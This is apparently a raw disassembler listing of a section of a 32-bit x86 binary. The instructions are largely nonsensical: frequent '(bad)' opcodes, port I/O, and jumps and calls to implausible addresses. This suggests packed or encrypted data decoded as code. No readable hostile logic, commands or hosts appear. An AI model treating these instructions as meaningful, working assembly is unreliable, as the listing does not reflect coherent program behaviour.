  4021f9:	arpl   bx,dx
  4021fb:	out    dx,al
  4021fc:	fs push esi
  4021fe:	loopne 0x402189
  402200:	leave  
  402201:	arpl   ax,sp
  402203:	jne    0x40225d
  402205:	xchg   ebx,eax
  402206:	in     eax,dx
  402207:	jmp    0x402195
  402209:	imul   esi,esp,0xffffffbf
  40220c:	rcr    BYTE PTR [edi-0x20],0x75
  402210:	nop
  402211:	ds data16 clc 
  402214:	fcom   QWORD PTR [ebx+0x26]
  402217:	or     ecx,DWORD PTR [ebx+ebp*2+0x432875e0]
  40221e:	(bad)  
  402220:	mov    WORD PTR [ebx-0x20],gs
  402223:	jne    0x4021a9
  402225:	push   ebx
  402226:	(bad)  
  402228:	adc    ebp,DWORD PTR [esi]
  40222a:	mov    dl,0xc2
  40222c:	xchg   esp,eax
  40222d:	imul   eax,DWORD PTR [esi-0x75],0xfffffff0
  402231:	jmp    0x52a00aed
  402236:	les    ecx,FWORD PTR [ebp-0xa4f0b7]
  40223c:	popa   
  40223d:	arpl   bx,dx
  40223f:	retf   0x6af0
  402242:	or     eax,DWORD PTR [ebp-0x488cca34]
  402248:	mov    WORD PTR [ecx+eiz*8+0x3],ss
	...
  40225f:	add    bl,cl
  402261:	fdivp  st(1),st
  402263:	(bad)  [esi]
  402265:	pop    esp
  402266:	pop    esi
  402267:	call   0xe89df171
  40226c:	cmp    DWORD PTR [eax+0x59],ebx
  40226f:	js     0x402228
  402271:	xchg   ebx,eax
  402272:	loope  0x402270
  402274:	jecxz  0x4021fa
  402276:	xchg   DWORD PTR gs:[esp+edx*4+0x64497ae1],ecx
  40227e:	outs   dx,BYTE PTR cs:[esi]
  402280:	cmp    BYTE PTR ds:0x948d0473,0x62
  402287:	mov    edi,0x3e19990
  40228c:	fcom   QWORD PTR [ecx+edx*4-0x1e6aca25]
  402293:	add    edx,DWORD PTR ds:0xe1e80dda
  402299:	dec    eax
  40229a:	or     DWORD PTR [eax-0x71],ebp
  40229d:	xchg   ebp,eax
  40229e:	loope  0x402222
  4022a0:	push   eax
  4022a1:	cdq    
  4022a2:	in     al,dx
  4022a3:	add    ecx,DWORD PTR [esp+eiz*4+0x252453e1]
  4022aa:	loope  0x4022af
  4022ac:	mov    WORD PTR ds:0x94b6dc24,ds
  4022b2:	mov    dh,0x71
  4022b4:	xor    BYTE PTR [esp+esi*1-0x10],dl
  4022b8:	sbb    ecx,edx
  4022ba:	leave  
  4022bb:	out    0x99,eax
  4022bd:	inc    esp
  4022be:	cdq    
  4022bf:	pop    ebp
  4022c0:	(bad)  
  4022c1:	xchg   ebp,eax
  4022c2:	loope  0x402246
	...
  4022d8:	enter  0x68a8,0x41
  4022dc:	hlt    
  4022dd:	push   ebx
  4022de:	sbb    al,0xe8
  4022e0:	in     al,0x8b
  4022e2:	call   0xebfb:0xfc538c04
  4022e9:	or     cl,BYTE PTR [eax]
  4022eb:	jae    0x4022e0
  4022ed:	push   ebx
  4022ee:	(bad)
  4022f3:	test   al,0x8f
  4022f5:	push   ebx
  4022f6:	jge    0x4022e9
  4022f8:	out    0x98,eax
  4022fa:	cmc    
  4022fb:	push   esi
  4022fc:	mov    bl,0x9f
  4022fe:	ror    BYTE PTR [esi+0x3d],1
  402301:	dec    eax
  402302:	idiv   DWORD PTR [edi+eiz*4-0x54c215c5]
  402309:	push   ebx
  40230a:	sub    edx,DWORD PTR [ecx]
  40230c:	mov    bl,0xc9
  40230e:	lock cs sbb eax,0x879cf73c
  402315:	cmp    eax,DWORD PTR [eax]
  402317:	sbb    al,0x6b
  402319:	push   ebx
  40231a:	sub    esi,DWORD PTR [ecx]
  40231c:	jae    0x4022e7
  40231e:	in     al,0x1
  402320:	adc    DWORD PTR [eax+ecx*1-0x1f368d17],0x11
  402328:	pop    ebx
  402329:	push   ebx
  40232a:	imul   ecx
  40232c:	jb     0x4022f7
  40232e:	add    BYTE PTR [ecx],al
  402330:	pop    ecx
  402331:	dec    ebp
  402332:	mul    esi
  402334:	(bad)  
  402335:	push   edi
  402336:	push   ebx
  402337:	mov    al,0x4d
  402339:	cwde   
  40233a:	or     BYTE PTR [eax+eax*1],bh
	...
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    BYTE PTR [edi+0x304c8b40],dh
  402355:	push   ebx
  402356:	jnp    0x402349
  402358:	xor    cl,cl
  40235a:	add    cl,dl
  40235c:	push   edx
  40235d:	ds or  cl,ch
  402360:	jbe    0x4023b6
  402362:	shr    DWORD PTR [ebx+0x725c5313],0xe3
  402369:	push   ds
  40236a:	dec    ebp
  40236b:	icebp  
  40236c:	mov    WORD PTR [eax+ecx*1],ss
  40236f:	jmp    0x29a30803
  402374:	rcl    BYTE PTR [edi-0x1e],1
  402377:	add    ch,dh
  402379:	xchg   esi,eax
  40237a:	rol    edx,0xe9
  40237d:	xchg   esi,eax
  40237e:	pop    ebp
  40237f:	mov    edx,DWORD PTR [ecx]
  402381:	loop   0x402377
  402383:	mov    esp,eax
  402385:	dec    esi
  402386:	or     BYTE PTR [ebp-0x3f],0x35
  40238a:	push   es
  40238b:	push   ecx
  40238c:	je     0x4023fe
  40238e:	or     ch,BYTE PTR [ebx]
  402390:	gs inc esi
  402392:	mov    ds:0xb382659,eax
  402397:	repz (bad) 
  402399:	fld    st(1)
  40239b:	ret    0x969d
  40239e:	pop    ebp
  40239f:	mov    edx,DWORD PTR [ecx-0x1f]
  4023a2:	pop    edi
  4023a3:	mov    esp,eax
  4023a5:	dec    edx
  4023a6:	repz mov ebp,DWORD PTR [eax]
  4023a9:	dec    esi
  4023aa:	or     BYTE PTR [ebp-0x7b],0x37
  4023ae:	or     dh,bl
  4023b0:	leave  
  4023b1:	ficom  DWORD PTR [esi-0x37]
	...
  4023c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c9:	dec    ecx
  4023ca:	not    DWORD PTR [esi+ebx*8+0x69]
  4023ce:	pop    esi
  4023cf:	push   edi
  4023d0:	faddp  st(4),st
  4023d2:	add    ah,bh
  4023d4:	out    dx,al
  4023d5:	mov    WORD PTR [eax],ds
  4023d7:	sub    esp,DWORD PTR [ebp+0x560c75ce]
  4023dd:	xchg   edi,eax
  4023de:	sti    
  4023df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e0:	ds (bad) 
  4023e3:	add    DWORD PTR [ebp-0x29],esp
  4023e6:	push   esi
  4023e7:	leave  
  4023e8:	out    0x4c,eax
  4023ea:	not    DWORD PTR [esi+ebx*4+0x6c]
  4023ee:	mov    eax,esp
  4023f0:	loope  0x4023d4
  4023f2:	pop    edi
  4023f3:	push   ebx
  4023f4:	int    0x96
  4023f6:	or     DWORD PTR [eax],eax
  4023f8:	and    eax,0x1d087d39
  4023fd:	es idiv edi
  402400:	and    cl,ah
  402402:	jne    0x40240c
  402404:	mov    WORD PTR [edx-0x1b21d4cb],es
  40240a:	or     al,0x1
  40240c:	mov    WORD PTR [ebx],?
  40240e:	jae    0x402424
  402410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402411:	ror    edx,1
  402413:	loop   0x4023ea
  402415:	mov    dh,0x6f
  402417:	or     BYTE PTR [ebx+0x7a],cl
  40241a:	jno    0x402491
  40241c:	cwde   
  40241d:	xor    DWORD PTR [edi],0xb3a68cfe
  402423:	sub    edx,edi
  402425:	mov    ch,0x8
  402427:	cmp    eax,DWORD PTR [ecx+edi*8]
  40242a:	jmp    0x40242c
	...
  402440:	push   ecx
  402441:	fnstenv [edx+0x4]
  402444:	pop    ebp
  402445:	cmp    esi,DWORD PTR [esi]
  402447:	dec    BYTE PTR [ebx+0x6fe47d1]
  40244d:	cmp    BYTE PTR [ecx],ah
  40244f:	mov    BYTE PTR [eax-0x7cba8eca],dl
  402455:	ret    
  402456:	or     BYTE PTR [edx],bh
  402458:	int    0x66
  40245a:	ds adc dh,bh
  40245d:	cmp    eax,0x7e6ac910
  402462:	addr16 aad 0xc7
  402465:	xor    cl,BYTE PTR [ebp-0x37]
  402468:	dec    esi
  402469:	aaa    
  40246a:	or     edx,DWORD PTR [ebp+0x7]
  40246d:	dec    edi
  40246e:	mov    ah,al
  402470:	inc    esp
  402471:	mov    es,WORD PTR [esi+0x57]
  402474:	inc    ebx
  402475:	call   0x3e467f6e
  40247a:	jae    0x4024c1
  40247c:	xor    DWORD PTR [ebp-0x7febfeb8],esi
  402482:	loopne 0x40240f
  402484:	daa    
  402485:	jp     0x4024bc
  402487:	mov    esp,DWORD PTR [ecx+0x1445b437]
  40248d:	cmp    ecx,DWORD PTR [ebx]
  40248f:	add    BYTE PTR [esp+edx*4+0x359c367a],cl
  402496:	and    esi,esp
  402498:	push   ecx
  402499:	dec    edi
  40249a:	out    dx,al
  40249b:	lods   eax,DWORD PTR ds:[esi]
  40249c:	dec    ecx
  40249d:	dec    edi
  40249e:	(bad)  
  40249f:	lods   eax,DWORD PTR ds:[esi]
  4024a0:	or     BYTE PTR [ecx+edi*2+0x4e],0x0
	...
  4024b8:	jecxz  0x40244d
  4024ba:	sbb    al,0xe8
  4024bc:	mov    ecx,DWORD PTR [edx]
  4024be:	and    al,0xe8
  4024c0:	push   es
  4024c1:	test   al,0xb9
  4024c3:	jnp    0x402526
  4024c5:	push   edx
  4024c6:	(bad)  
  4024c7:	lods   eax,DWORD PTR ds:[esi]
  4024c8:	dec    ecx
  4024c9:	dec    edi
  4024ca:	jns    0x4024db
  4024cc:	je     0x40246f
  4024ce:	xchg   edi,eax
  4024cf:	ds mov al,0x1d
  4024d2:	mov    esp,0x9a814e4
  4024d7:	jp     0x402512
  4024d9:	push   ecx
  4024da:	jecxz  0x40252a
  4024dc:	call   0x39d7:0x729d51d
  4024e3:	xor    esp,DWORD PTR [eax-0x7bc1d17c]
  4024e9:	xor    esp,DWORD PTR [ecx]
  4024eb:	jns    0x4024be
  4024ed:	push   ecx
  4024ee:	imul   eax,DWORD PTR [eax],0x7b05da06
  4024f4:	iret   
  4024f5:	xchg   ebp,eax
  4024f6:	scas   al,BYTE PTR es:[edi]
  4024f7:	inc    ebp
  4024f8:	(bad)  
  4024f9:	pop    ebp
  4024fa:	and    esi,edi
  4024fc:	pop    ebx
  4024fd:	jmp    0x594dfc6c
  402502:	cmc    
  402503:	in     al,0x4b
  402505:	push   eax
  402506:	xor    ch,BYTE PTR [edi]
  402508:	and    ch,BYTE PTR [si]
  40250b:	loopne 0x4024e9
  40250d:	dec    edi
  40250e:	push   esp
  40250f:	or     al,0x24
  402511:	retf   0x4cb
  402514:	mov    WORD PTR [ecx],ds
  402516:	mov    eax,ds:0xe1271413
  40251b:	add    eax,DWORD PTR [eax]
	...
  40252d:	add    BYTE PTR [eax],al
  40252f:	add    BYTE PTR [edi+ecx*2+0x3c803c08],cl
  402536:	dec    ebp
  402537:	mov    bh,0xef
  402539:	dec    edi
  40253a:	sub    DWORD PTR [esp+eiz*8],0xe89d7d4f
  402541:	mov    ah,cl
  402543:	jmp    0x1608c0d7
  402548:	outs   dx,DWORD PTR ds:[esi]
  402549:	sbb    eax,0xc9ef794d
  40254e:	cld    
  40254f:	xchg   ecx,eax
  402550:	dec    si
  402552:	div    DWORD PTR [esi+0x1]
  402555:	(bad)  
  402557:	outs   dx,BYTE PTR ds:[esi]
  402558:	gs dec eax
  40255a:	neg    esp
  40255c:	out    0x4f,eax
  40255e:	jge    0x4025b9
  402560:	test   al,0x20
  402562:	not    BYTE PTR [esi-0x51]
  402565:	dec    edi
  402566:	jge    0x4025b5
  402568:	mov    eax,0x8fe9e1ac
  40256d:	dec    edi
  40256e:	jge    0x40255d
  402570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402571:	cwde   
  402572:	loope  0x40255d
  402574:	(bad)  
  402575:	in     al,0xf7
  402577:	mov    ah,0x9b
  402579:	and    DWORD PTR [ebp-0x8b091e9],ecx
  40257f:	mov    ecx,0x16f5f967
  402584:	outs   dx,DWORD PTR ds:[esi]
  402585:	dec    edi
  402586:	jge    0x40259d
  402588:	outs   dx,DWORD PTR ds:[esi]
  402589:	leave  
  40258a:	lock je 0x4025a2
  40258d:	ds idiv dh
  402590:	outs   dx,BYTE PTR ds:[esi]
  402591:	in     al,0xe0
  402593:	test   DWORD PTR [eax],0x0
	...
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	add    BYTE PTR [ebp+0x4f],ch
  4025aa:	imul   esi
  4025ac:	in     al,0x9c
  4025ae:	loopne 0x402604
  4025b0:	pusha  
  4025b1:	dec    edi
  4025b2:	not    DWORD PTR [ebx-0x78]
  4025b5:	mov    esp,0x94c92149
  4025ba:	not    DWORD PTR [eax+ebx*4+0x3c]
  4025be:	mov    bl,0x0
  4025c0:	dec    edi
  4025c1:	xor    dh,bh
  4025c3:	or     ebp,ebp
  4025c5:	xor    DWORD PTR [ebp-0xc],edi
  4025c8:	(bad)  
  4025ca:	lock inc eax
  4025cd:	mov    al,ds:0x322fabe0
  4025d2:	mul    DWORD PTR [ebx]
  4025d4:	int    0x31
  4025d6:	jge    0x4025d0
  4025d8:	or     eax,0x1afff50e
  4025dd:	xor    bh,BYTE PTR [ebp+0x8]
  4025e0:	std    
  4025e1:	repz (bad) 
  4025e3:	call   FWORD PTR [edx+0x1e]
  4025e6:	retf   
  4025e7:	pop    ebx
  4025e8:	sub    al,0x59
  4025ea:	add    BYTE PTR [eax],al
  4025ec:	mov    al,ds:0x7183e41f
  4025f1:	addr16 pop edi
  4025f3:	mov    esi,eax
  4025f5:	inc    esi
  4025f6:	add    al,al
  4025f8:	rcr    DWORD PTR [edi+ecx*8+0x892b500],1
  4025ff:	add    BYTE PTR [esi+0x33],bh
  402602:	mov    edi,DWORD PTR [ebp-0x53]
  402605:	xchg   edi,eax
  402606:	jge    0x40260f
  402608:	pop    ds
  402609:	xchg   ebx,eax
  40260a:	or     al,BYTE PTR [eax]
	...
  402620:	jne    0x402661
  402622:	pop    es
  402623:	sub    DWORD PTR [eax],0x4a
  402626:	or     DWORD PTR [ebp+0x72],esi
  402629:	xor    BYTE PTR [eax],cl
  40262b:	add    DWORD PTR [ebp-0x6e],esp
  40262e:	jecxz  0x402632
  402630:	dec    esi
  402631:	or     BYTE PTR [ecx+0xa926cca],cl
  402637:	add    al,ch
  402639:	fdivr  st(4),st
  40263b:	push   eax
  40263c:	idiv   DWORD PTR [edi-0x623f00f8]
  402642:	div    DWORD PTR [ebp+0x3d]
  402645:	cmp    ch,BYTE PTR [edx+0x39225e9]
  40264b:	ror    BYTE PTR [eax+esi*8+0x63d18d79],0x3c
  402653:	push   0xffffff8c
  402655:	enter  0xf44f,0xbc
  402659:	loope  0x402667
  40265b:	call   FWORD PTR [ecx+0x875e86b]
  402661:	push   esp
  402662:	xchg   ecx,ebp
  402664:	mov    WORD PTR [ebx],?
  402666:	add    al,0xc0
  402668:	cmp    DWORD PTR [edi-0x73],0x5f3bf47d
  40266f:	inc    esi
  402670:	pop    fs
  402672:	rol    BYTE PTR [ecx],1
  402674:	pop    ecx
  402675:	cmp    eax,0x3cd47d8c
  40267a:	pop    edi
  40267b:	cmp    al,BYTE PTR [edi]
  40267d:	adc    esp,0x4a135c40
  402683:	std    
	...
  402698:	ret    
  402699:	mov    dh,0x85
  40269b:	clc    
  40269c:	or     ecx,edi
  40269e:	rcl    BYTE PTR [eax+0x5b],cl
  4026a1:	push   ecx
  4026a2:	or     ebp,DWORD PTR [edx-0x74]
  4026a5:	ficomp WORD PTR [edi+0x10]
  4026a8:	mov    ds:0x43e8d710,eax
  4026ad:	in     al,0xc
  4026af:	add    BYTE PTR [edi-0x1cf5af85],al
  4026b5:	shl    DWORD PTR [ecx],cl
  4026b7:	std    
  4026b8:	xor    DWORD PTR [esi+0x25],0xffffffff
  4026bc:	addr16 aas 
  4026be:	test   BYTE PTR [ebp-0x68],al
  4026c1:	xor    cl,bl
  4026c3:	je     0x402656
  4026c5:	sahf   
  4026c6:	pop    edi
  4026c7:	clc    
  4026c8:	adc    edi,DWORD PTR [ebx]
  4026ca:	call   0x15e37f44
  4026cf:	jmp    0xc7c46260
  4026d4:	xchg   edi,eax
  4026d5:	jnp    0x402736
  4026d7:	sbb    al,0xf
  4026d9:	xchg   esp,eax
  4026da:	ins    BYTE PTR es:[edi],dx
  4026db:	cld    
  4026dc:	(bad)  
  4026dd:	sar    edi,0x8c
  4026e0:	leave  
  4026e1:	lods   al,BYTE PTR ds:[esi]
  4026e2:	and    DWORD PTR [ebx+ebp*1],esi
  4026e5:	(bad)  
  4026e6:	std    
  4026e7:	loopne 0x402682
  4026e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ea:	into   
  4026eb:	push   esi
  4026ec:	mov    BYTE PTR [ebp+0x3c],cl
  4026ef:	or     al,0x24
  4026f1:	jae    0x4026b1
  4026f3:	loopne 0x402700
  4026f5:	in     eax,dx
  4026f6:	test   al,0xc5
  4026f8:	cwde   
  4026f9:	xchg   esp,eax
  4026fa:	xor    al,0x8d
	...
  402710:	call   0x8d4c3b27
  402715:	xchg   esp,eax
  402716:	loope  0x40269b
  402718:	popa   
  402719:	fwait
  40271a:	xchg   BYTE PTR [esi],dl
  40271c:	(bad)  
  40271d:	(bad)  [eax]
  40271f:	add    al,0xb
  402721:	xlat   BYTE PTR ds:[ebx]
  402722:	stc    
  402723:	ins    DWORD PTR es:[edi],dx
  402724:	mov    WORD PTR [ebp-0xc],cs
  402727:	test   edx,0x39e0d1c6
  40272d:	mov    al,ds:0x3c84566e
  402732:	pop    ebp
  402733:	loope  0x4026e8
  402735:	dec    esp
  402736:	sub    ch,al
  402738:	jl     0x4026ce
  40273a:	or     al,ah
  40273c:	pop    ss
  40273d:	fs adc ch,ah
  402740:	aad    0x9a
  402742:	loope  0x402747
  402744:	mov    WORD PTR [ebx+0x4b],fs
  402747:	push   esp
  402748:	cwde   
  402749:	adc    eax,0xfe1e1233
  40274e:	sub    al,0x82
  402750:	jle    0x4026f8
  402752:	lock repnz pushf 
  402755:	ss jp  0x8ae138dc
  40275c:	int    0x94
  40275e:	(bad)  
  402760:	loope  0x4027d0
  402762:	and    dh,BYTE PTR [esi]
  402764:	pop    es
  402765:	cmp    DWORD PTR [eax],ecx
  402767:	sahf   
  402768:	sbb    dl,dl
  40276a:	add    dh,dh
  40276c:	(bad)  
  40276d:	pop    ds
  40276e:	jne    0x402765
  402770:	push   es
  402771:	ficomp DWORD PTR [eax]
  402773:	repnz add BYTE PTR [eax],al
	...
  402786:	add    BYTE PTR [eax],al
  402788:	inc    eax
  402789:	rcl    DWORD PTR [eax],0x62
  40278c:	loopne 0x4027e3
  40278e:	loop   0x402771
  402790:	jge    0x402725
  402792:	sub    eax,0x89490c6
  402797:	jb     0x40271d
  402799:	adc    DWORD PTR [eax+0x60],ecx
  40279c:	push   ecx
  40279d:	xchg   esp,eax
  40279e:	cmp    ebp,DWORD PTR [ebx-0x611fc9b5]
  4027a4:	inc    eax
  4027a5:	in     al,dx
  4027a6:	shr    DWORD PTR [ebx+0x625d949c],0xdc
  4027ad:	out    0x8b,eax
  4027af:	or     al,0x90
  4027b1:	xchg   esp,eax
  4027b2:	jge    0x4027a2
  4027b4:	rcl    cl,cl
  4027b6:	add    BYTE PTR [edi],dh
  4027b8:	inc    eax
  4027b9:	aad    0x8
  4027bb:	push   0x2d
  4027bd:	cwde   
  4027be:	or     ah,dh
  4027c0:	mov    dl,BYTE PTR [ebx+0x4d]
  4027c3:	cmc    
  4027c4:	and    ebp,ebx
  4027c6:	dec    ecx
  4027c7:	jmp    0x4140e99e
  4027cc:	mov    eax,ds:0x16e90832
  4027d1:	ins    DWORD PTR es:[edi],dx
  4027d2:	idiv   DWORD PTR [ebx+ecx*4-0x77b9f0c4]
  4027d9:	xchg   esp,eax
  4027da:	or     edx,DWORD PTR [ecx]
  4027dc:	iret   
  4027dd:	out    0xe0,eax
  4027df:	out    dx,al
  4027e0:	arpl   WORD PTR [ebx-0x9],cx
  4027e3:	jb     0x40281d
  4027e5:	dec    ebx
  4027e6:	jge    0x4027d9
  4027e8:	mov    esi,0xe193c
	...
  4027fd:	add    BYTE PTR [eax],al
  4027ff:	add    BYTE PTR [eax-0x6c6b086c],dl
  402805:	out    0xe0,eax
  402807:	add    BYTE PTR [ebx+0x32],ah
  40280a:	or     BYTE PTR [eax],al
  40280c:	ficom  WORD PTR [edi+0x53]
  40280f:	leave  
  402810:	ja     0x4027aa
  402812:	or     BYTE PTR [ebp-0x52],dl
  402815:	inc    esp
  402816:	pop    ebx
  402817:	xor    DWORD PTR [eax+0x2a750898],0x52
  40281e:	dec    ebp
  40281f:	or     BYTE PTR [ebx],cl
  402821:	fisttp WORD PTR [ecx+0x0]
  402824:	mov    dh,0xb4
  402826:	add    al,0x0
  402828:	pop    eax
  402829:	xchg   ebx,eax
  40282a:	iret   
  40282b:	inc    ebp
  40282c:	and    DWORD PTR [ecx],esp
  40282e:	inc    eax
  40282f:	inc    ecx
  402830:	cmc    
  402831:	imul   edi,DWORD PTR [ebp+0x8],0xedf3cd
  402838:	in     eax,0x1d
  40283a:	sar    bh,1
  40283c:	cwde   
  40283d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40283e:	loopne 0x4027f3
  402840:	sbb    edx,DWORD PTR [edi-0x29e2fcf8]
  402846:	pop    ebx
  402847:	call   0x37964a
  40284c:	pop    esi
  40284d:	maskmovq mm6,(bad)
  40284e:	div    DWORD PTR [ebp-0x53]
  402851:	test   eax,esp
  402853:	mov    ebp,0xff08970b
  402858:	fcomp  DWORD PTR [edx+0x30efe85b]
  40285e:	or     BYTE PTR [eax],al
  402860:	xor    al,0xb4
  402862:	add    BYTE PTR [esi+0x0],dh
	...
  402878:	in     eax,dx
  402879:	iret   
  40287a:	or     BYTE PTR [ebp+ebx*4+0x69],dh
  40287e:	jge    0x402888
  402880:	cmp    eax,0xc2fff2fa
  402885:	push   ds
  402886:	retf   
  402887:	pop    ebx
  402888:	lods   al,BYTE PTR ds:[esi]
  402889:	push   ebx
  40288a:	add    BYTE PTR [eax],al
  40288c:	cmp    BYTE PTR [edi],bl
  40288e:	in     al,0x83
  402890:	test   eax,0x8c685f69
  402895:	cmp    BYTE PTR [eax+eax*1],cl
  402898:	mov    WORD PTR [ebx-0x6ca4045b],ss
  40289e:	test   BYTE PTR [ebp+0x50],al
  4028a1:	mov    edi,0xfcd7ec28
  4028a6:	or     al,BYTE PTR [eax]
  4028a8:	mov    ecx,0x3b16e23d
  4028ad:	jmp    0xe5cc939a
  4028b2:	or     al,0xff
  4028b4:	mov    eax,ds:0x23006133
  4028b9:	inc    ecx
  4028ba:	out    0x4b,eax
  4028bc:	int    0x3b
  4028be:	mov    es,eax
  4028c0:	xchg   ebp,eax
  4028c1:	adc    ebp,0x75
  4028c4:	or     BYTE PTR [ecx+eiz*2-0x5],dl
  4028c8:	add    edi,ebx
  4028ca:	int3   
  4028cb:	inc    ebp
  4028cc:	clc    
  4028cd:	cmp    ecx,DWORD PTR [ebx]
  4028cf:	add    BYTE PTR [edx+ebp*8+0x3b4d4bdc],cl
  4028d6:	loopne 0x402905
  4028d8:	pop    ss
  4028d9:	inc    ebx
  4028da:	add    BYTE PTR [ebp+0x0],0x0
	...
  4028ee:	add    BYTE PTR [eax],al
  4028f0:	test   BYTE PTR [eax-0x2c],bl
  4028f3:	jg     0x4028c8
  4028f5:	retf   0x4213
  4028f8:	nop
  4028f9:	dec    eax
  4028fa:	lock imul ecx,DWORD PTR [eax+ebp*8+0x635c084a],0x3b4d4d17
  402906:	aam    0x32
  402908:	mov    ah,0x7
  40290a:	aad    0xff
  40290c:	mov    ds:0x9174cb36,eax
  402911:	les    ecx,FWORD PTR [edi-0x4]
  402914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402915:	inc    ebx
  402916:	mov    bh,al
  402918:	nop
  402919:	mov    esi,0xa9f90015
  40291e:	add    DWORD PTR [ebp+0x78],0x4ecace94
  402925:	nop
  402926:	loope  0x40295e
  402928:	pop    ss
  402929:	cmp    BYTE PTR [edx-0x15633678],dh
  40292f:	ret    
  402930:	loopne 0x4028c1
  402932:	popa   
  402933:	sbb    al,0x8c
  402935:	mov    edi,0x948c9bfb
  40293a:	loope  0x40293f
  40293c:	out    0x5b,eax
  40293e:	and    ecx,DWORD PTR [eax]
  402940:	mov    WORD PTR [esi-0x4173961f],?
  402946:	loop   0x4029b1
  402948:	mov    WORD PTR [esi-0x6bf3941f],?
  40294e:	loope  0x402953
  402950:	sbb    edi,DWORD PTR [edi+0xebf9]
	...
  402966:	add    BYTE PTR [eax],al
  402968:	fsubr  QWORD PTR [esi]
  40296a:	loope  0x40296f
  40296c:	pop    ss
  40296d:	ins    BYTE PTR es:[edi],dx
  40296e:	or     al,ah
  402970:	dec    edi
  402971:	shr    dl,0x30
  402974:	in     al,0xf8
  402976:	add    DWORD PTR [ebx],0xffffff8c
  402979:	or     al,0xe0
  40297b:	add    ecx,DWORD PTR [esp+edx*4-0x703134c6]
  402982:	loope  0x4029ba
  402984:	pop    es
  402985:	cmp    BYTE PTR [edx+0x46],bh
  402988:	test   BYTE PTR [ebp+0x149157a1],bl
  40298e:	mov    ecx,0x399b3903
  402993:	add    ecx,DWORD PTR [esp+edx*4-0x7031351f]
  40299a:	loope  0x402978
  40299c:	and    DWORD PTR [ecx+ecx*2-0x1e6c5668],ebx
  4029a3:	adc    BYTE PTR [eax+ecx*2-0x5c1af14b],0xe1
  4029ab:	add    ecx,DWORD PTR [edi+edx*4-0x67b0a3f8]
  4029b2:	mov    esi,0xb0926429
  4029b7:	jmp    0x3048be4b
  4029bc:	dec    ebp
  4029bd:	xchg   ecx,eax
  4029be:	or     BYTE PTR [esp+edx*1+0x3b258b39],bh
  4029c5:	mov    ebx,0x478f9308
  4029ca:	jge    0x4029bd
	...
  4029e0:	aaa    
  4029e1:	and    ebp,ebp
  4029e3:	jmp    0x7608c577
  4029e8:	gs in  al,0x58
  4029eb:	shl    DWORD PTR [edx+0x19def74a],1
  4029f1:	shl    ah,cl
  4029f3:	xor    DWORD PTR [eax+0x47],ebx
  4029f6:	jge    0x4029c5
  4029f8:	aaa    
  4029f9:	ret    0xd100
  4029fc:	mov    cl,0x31
  4029fe:	or     cl,ch
  402a00:	call   0xf4c1:0xe6e57d54
  402a07:	shr    DWORD PTR [edi+0x4a],0xf7
  402a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a0c:	mov    ds:0x1aeae354,eax
  402a11:	shl    ah,cl
  402a13:	mov    al,ds:0x340890ca
  402a18:	or     edi,DWORD PTR [ecx]
  402a1a:	pop    ebx
  402a1b:	jb     0x4029b2
  402a1d:	cwde   
  402a1e:	(bad)  
  402a1f:	fld    DWORD PTR [edx-0x188c8cc4]
  402a25:	inc    edi
  402a26:	(bad)  
  402a27:	jmp    0xeaa2be55
  402a2c:	and    DWORD PTR [edx+eiz*2+0x89437ea],edx
  402a33:	jmp    0xe1bd7247
  402a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a39:	inc    eax
  402a3a:	in     al,dx
  402a3b:	add    BYTE PTR [ebp+0x35038193],ah
  402a41:	xlat   BYTE PTR ds:[ebx]
  402a42:	push   esp
  402a43:	push   0x0
	...
  402a55:	add    BYTE PTR [eax],al
  402a57:	add    BYTE PTR [ebp-0x7d],dh
  402a5a:	loopne 0x402a91
  402a5c:	rcl    BYTE PTR [eax-0x70d976f8],1
  402a62:	bound  eax,QWORD PTR [eax]
  402a64:	call   DWORD PTR [edx-0x6ef0ff9e]
  402a6a:	bound  eax,QWORD PTR [eax]
  402a6c:	mov    bl,BYTE PTR [edi-0x6f7fd820]
  402a72:	or     BYTE PTR [ebx],cl
  402a74:	jne    0x402a5a
  402a76:	daa    
  402a77:	mov    esi,esi
  402a79:	inc    esi
  402a7a:	popa   
  402a7b:	add    BYTE PTR [edi],cl
  402a7d:	xchg   ebx,eax
  402a7e:	bound  eax,QWORD PTR [eax]
  402a80:	fist   WORD PTR [eax+ebx*2+0x8358de8]
  402a87:	add    BYTE PTR [esi+ecx*8-0x1c1af500],ch
  402a8e:	sub    al,0xff
  402a90:	push   esi
  402a91:	xchg   esp,eax
  402a92:	loopne 0x402a4f
  402a94:	rcl    DWORD PTR [edx+0x3b06ff08],1
  402a9a:	mov    esp,0xcf92e5e4
  402a9f:	add    ebp,DWORD PTR [edx]
  402aa1:	push   0xfffffff7
  402aa3:	(bad)  
  402aa4:	(bad)  
  402aa5:	fwait
  402aa6:	div    DWORD PTR [ebx]
  402aa8:	or     eax,0xe500ebf4
  402aad:	push   ecx
  402aae:	or     edi,edi
  402ab0:	or     ch,BYTE PTR [edx-0x9]
  402ab3:	sub    esi,ebp
  402ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab6:	dec    ebx
  402ab7:	or     BYTE PTR [edx+0x5bc8c3],ch
	...
  402acd:	add    BYTE PTR [eax],al
  402acf:	add    ah,ch
  402ad1:	push   eax
  402ad2:	add    BYTE PTR [eax],al
  402ad4:	lock adc eax,0x8c1e53e4
  402ada:	add    BYTE PTR [ebx+0x74d3a28c],al
  402ae0:	adc    esi,0x5e
  402ae3:	or     BYTE PTR [edx+ebp*4-0x7973ff29],ah
  402aea:	pop    esi
  402aeb:	add    al,0x74
  402aed:	push   es
  402aee:	xlat   BYTE PTR ds:[ebx]
  402aef:	add    BYTE PTR [esi+esi*2-0x681c17e2],cl
  402af6:	or     eax,DWORD PTR [eax]
  402af8:	mov    DWORD PTR [ebp+ecx*8-0x79f773fc],0xeb700dec
  402b03:	out    dx,eax
  402b04:	push   ebx
  402b05:	(bad)  
  402b06:	cmp    DWORD PTR [edi+0xf],edx
  402b09:	or     DWORD PTR [edi],edi
